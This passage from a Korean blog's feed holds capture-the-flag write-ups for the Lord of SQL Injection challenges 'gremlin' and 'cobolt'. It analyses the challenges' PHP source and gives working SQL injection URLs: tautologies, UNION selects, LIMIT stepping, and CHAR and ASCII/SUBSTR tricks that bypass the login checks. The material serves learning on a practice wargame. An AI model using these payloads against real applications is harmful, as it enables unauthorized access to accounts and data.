class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"cobolt"</span>);</span><br><span class="line"><span class="keyword">elseif</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result['id']&#125;&lt;br&gt;You are not admin :(&lt;/h2&gt;"</span>;</span><br></pre></td></tr></table></figure><ul><li>받은 <code>id</code>와 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>1번 문제와 거의 동일하며, 문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>admin</code> 문자열 직접 삽입</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=admin&apos;-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_cobolt <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">-- -' and pw=md5('')</span></span><br></pre></td></tr></table></figure><p>이는 결국 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li><li><p><code>UNION</code> 구문 이용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=&apos; union select &apos;admin&apos;-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_cobolt <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">''</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">'admin'</span><span class="comment">-- -' and pw=md5('')</span></span><br></pre></td></tr></table></figure><p>이는 결국 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li><li><p><code>LIMIT</code> 구문 이용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=&apos; or 1=1-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_cobolt <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">''</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">-- -' and pw=md5('')</span></span><br></pre></td></tr></table></figure><p>이는 테이블의 모든 행을 불러오도록 조작하는 SQL Injection이다. 이를 수행하면 다음과 같은 문자열이 응답에 포함된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello rubiya</span><br><span class="line">You are not admin :(</span><br></pre></td></tr></table></figure><p>이 문자열로 미루어 보아 테이블에 <code>admin</code>이라는 <code>id</code>를 가진 행이 있을 것임을 추측할 수 있다.</p><p>또한 현재는 테이블의 <code>rubiya</code>라는 <code>id</code>를 가진 첫 번째 행이 들어가지만 <code>$result[&#39;id&#39;]</code>에 들어가는 행을 하나씩 당겨보는 것을 <code>id</code>가 <code>admin</code>인 행에 도달할 때까지 반복하면 문제가 풀릴 것임을 추측할 수 있다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=&apos; or 1=1 limit 1,1-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_cobolt <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">''</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span><span class="comment">-- -' and pw=md5('')</span></span><br></pre></td></tr></table></figure><p>위 SQL Injection은 prob_cobolt 테이블의 2번째 행의 <code>id</code>가 <code>admin</code>이기 때문에 결국 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li><li><p><code>CHAR()</code> 함수 및 ASCII 코드 활용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=&apos; or id=char(97, 100, 109, 105, 110)-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_cobolt <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="built_in">char</span>(<span class="number">97</span>, <span class="number">100</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">110</span>)<span class="comment">-- -' and pw=md5('')</span></span><br></pre></td></tr></table></figure><p>이는 ASCII에서 10진수 표기를 문자 표기로 바꿔주는 MySQL 함수인 <code>CHAR</code>를 이용하여 <code>id</code>가 <code>admin</code>인 행을 찾아 선택하도록 만든다.</p><p>ASCII에서, <code>&#39;a&#39;</code>=<code>97</code>, <code>&#39;d&#39;</code>=<code>100</code>, <code>&#39;m&#39;</code>=<code>109</code>, <code>&#39;i&#39;</code>=<code>105</code>, <code>&#39;n&#39;</code>=<code>110</code>이다.</p><p>따라서 이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li><li><p>ASCII(), SUBSTR() 함수 및 ASCII 코드 활용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=&apos; or ascii(substr(id, 1, 1))=97-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_cobolt <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">id</span>, <span class="number">1</span>, <span class="number">1</span>))=<span class="number">97</span><span class="comment">-- -' and pw=md5('')</span></span><br></pre></td></tr></table></figure><p>이는 ASCII에서 문자 표기자 10진수 표기로 바꿔주는 MySQL 함수인 <code>ASCII</code>를 이용하여 <code>id</code>가 <code>a</code>로 시작하는 행을 찾아 선택하도록 만든다.</p><p>이번에는 운이 좋아 <code>a</code>로 시작하는 첫번째 행이 <code>admin</code>이었지만, 만약 안되면 1번째 글자가 <code>a</code>, 2번째 글자가 <code>d</code>, 3번째 글자가 <code>m</code>, 4번째 글자가 <code>i</code>, 5번째 글자가 <code>n</code>인 행을 찾도록 조작하면 된다.</p><p>ASCII에서, <code>&#39;a&#39;</code>=<code>97</code>이다.</p><p>따라서 이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 2번 cobolt 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.1 Gremlin</title>
    <link href="https://www.jslee.me/2019/08/12/los-write-up-01-gremlin/"/>
    <id>https://www.jslee.me/2019/08/12/los-write-up-01-gremlin/</id>
    <published>2019-08-12T02:24:33.000Z</published>
    <updated>2019-08-20T11:08:10.031Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 1번 gremlin 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>기본적인 SQL Injection을 통해 SQL문을 조작할 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="include"><a href="#include" class="headerlink" title="include"></a>include</h4><ul><li>php의 include에 대해 잘 모르겠다면 다음 링크를 참고하자.</li><li><a href="http://php.net/manual/kr/function.include.php" target="_blank" rel="noopener">PHP: include - Manual</a></li></ul><h4 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int preg_match ( string $pattern , string $subject [, <span class="keyword">array</span> &amp;$matches [, int $flags [, int $offset ]]] )</span><br></pre></td></tr></table></figure><ul><li>preg_match 함수는 문자열에서 정규표현식 매치를 수행한다.</li><li>반환값은 매치된 횟수이며, 0 또는 1 이다. 이는 처음 매치 후 검색을 중지하기 때문이다.</li><li>php의 preg_match 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.<ul><li><a href="http://php.net/manual/kr/function.preg-match.php" target="_blank" rel="noopener">PHP: preg_match - Manual</a></li></ul></li></ul><h4 id="정규-표현식-Regular-Expression"><a href="#정규-표현식-Regular-Expression" class="headerlink" title="정규 표현식 (Regular Expression)"></a>정규 표현식 (Regular Expression)</h4><ul><li>정규 표현식은 특정한 규칙을 가진 문자열의 집합을 표현하는 데 사용하는 형식 언어이다.</li><li>정규 표현식에 대해 잘 모르겠다면 다음 링크를 참고하자.<ul><li><a href="https://ko.wikipedia.org/wiki/%EC%A0%95%EA%B7%9C_%ED%91%9C%ED%98%84%EC%8B%9D" target="_blank" rel="noopener">정규 표현식 - 위키백과</a></li><li><a href="http://regexr.com/" target="_blank" rel="noopener">정규 표현식 테스트 사이트 RegExr</a></li></ul></li></ul><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>gremlin 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); <span class="comment">// do not try to attack another table, database!</span></span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_gremlin where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) solve(<span class="string">"gremlin"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">login_chk();</span><br><span class="line">dbconnect();</span><br></pre></td></tr></table></figure><ul><li><code>config.php</code> 파일을 불러와 적용시킨다. <code>config.php</code> 내부에 <code>login_chk()</code>, <code>dbconnect()</code>, <code>solve()</code> 등 문제 풀이 환경과 관련된 함수가 선언되어 있을 것으로 추정할 수 있다.</li><li><code>login_chk()</code> 함수는 로그인 된 상태인지 확인하는 기능을 할 것으로 추정할 수 있다.</li><li><code>dbconnect()</code> 함수는 데이터베이스에 연결하는 기능을 할 것으로 추정할 수 있다.</li></ul><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); <span class="comment">// do not try to attack another table, database!</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>id</code>와 <code>pw</code>를 받으며, <code>id</code>나 <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.<ul><li><code>preg_match(&#39;/prob|_|\.|\(\)/i&#39;, $_GET[id])</code> 는 <code>$_GET[id]</code>에서 정규표현식 <code>&#39;/prob|_|\.|\(\)/i&#39;</code> 을 매치한다.</li><li>즉, <code>if(preg_match(&#39;/prob|_|\.|\(\)/i&#39;, $_GET[id])) exit(&quot;No Hack ~_~&quot;);</code> 이 문장을 통해 <code>$_GET[id]</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 중 하나라도 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li></ul></li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_gremlin where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) solve(<span class="string">"gremlin"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>id</code>와 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 참이 되는 어떤 문자열이든 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>WHERE 조건절 무력화<br>GET 방식으로 정보를 전송하기 위해 다음과 같이 URL의 맨 끝에 쿼리 스트링을 붙인다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=&apos; or 1=1 -- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_gremlin <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">''</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">-- -' and pw=''</span></span><br></pre></td></tr></table></figure><p>이는 WHERE 조건절을 항상 참으로 만들어 <code>prob_gremlin</code> 테이블의 모든 행의 <code>id</code> 열을 불러오도록 하므로 문제가 풀린다.</p></li><li><p>UNION 구문 이용</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=&apos; union select &apos;a&apos;-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_gremlin <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">''</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">'a'</span><span class="comment">-- -' and pw=''</span></span><br></pre></td></tr></table></figure><p>이는 결국 <code>$result[&#39;id&#39;]</code>에 <code>&#39;a&#39;</code>가 들어가도록 하므로 문제가 풀린다.</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 1번 gremlin 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
</feed>
